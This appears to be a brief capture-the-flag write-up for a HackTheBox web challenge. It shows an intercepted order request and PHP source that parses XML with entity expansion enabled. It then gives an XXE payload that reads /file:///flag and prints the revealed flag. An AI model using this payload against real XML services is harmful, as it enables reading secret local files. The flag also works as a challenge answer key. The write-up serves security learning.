@@ -1,0 +1,37 @@
+access: http://144.126.206.249:30820/
+
+choose ice creem and order intercept it:
+POST /api/order HTTP/1.1
+Host: 144.126.206.249:30820
+Content-Length: 37
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36
+Content-Type: application/json
+Accept: */*
+Origin: http://144.126.206.249:30820
+Referer: http://144.126.206.249:30820/
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Connection: close
+
+{"table_num":"1","food":"Ice Scream"}
+
+download source code, some xxe vulnerability:
+else if ($_SERVER['HTTP_CONTENT_TYPE'] === 'application/xml')
+{
+    $order = simplexml_load_string($body, 'SimpleXMLElement', LIBXML_NOENT);
+    if (!$order->food) return 'You need to select a food option first';
+    return "Your {$order->food} order has been submitted successfully.";
+}
+
+payload:
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///flag"> ]>
+<order>
+<food>&xxe;</food>
+</order>
+
+response:
+Your HTB{wh0_l3t_th3_XX3_0ut??w00f..w00f..w00f..WAFfles!} order has been submitted successfully.
+
+resource:
+https://thecybergeek.co.uk/challenge/walkthrough/hackthebox/2021/02/22/HackTheBox-BabyWaFflesOrder.html
